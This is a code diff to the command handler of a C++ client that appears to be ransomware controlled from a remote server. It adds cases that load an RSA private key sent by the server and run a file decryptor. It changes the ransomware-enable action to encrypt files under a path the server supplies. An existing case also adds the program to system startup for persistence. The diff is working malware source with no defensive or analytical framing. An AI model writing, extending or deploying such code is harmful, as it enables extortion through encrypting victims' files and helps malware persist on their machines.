@@ -208,8 +208,29 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
     std::string cmdOutput = "";
 
     switch ( command.action ) {
+    case Action::kSetAsDecryptionKey:
+        const unsigned char* der = reinterpret_cast<const unsigned char* >( command.buffer );
+
+        RSA* key = d2i_RSAPrivateKey(nullptr, &der, command.buffLen);
+        if ( !key ) {
+            success = FALSE;
+            break;
+        }
+
+        this->m_FileManager.SetPrivateKey(key);
+
+        success = TRUE;
+        break;
+    case Action::kRunDecryptor:
+        // its still called even if we havent received the private key from the server 
+        // wont decrypt anything though because we dont have the private key
+        this->m_FileManager.TransformFiles(command.buffer, &FileManager::DecryptContents, this->m_FileManager);
+        success = TRUE;
+        break;
     case Action::kRansomwareEnable:
-        this->m_FileManager.TransformFiles("C:\\", FileManager::EncryptContents, this->m_FileManager);
+        this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
+        success = TRUE;
+        break;
     case Action::kAddToStartup:
         this->m_ProcMgr.AddProcessToStartup(command.buffer);
         success = TRUE;
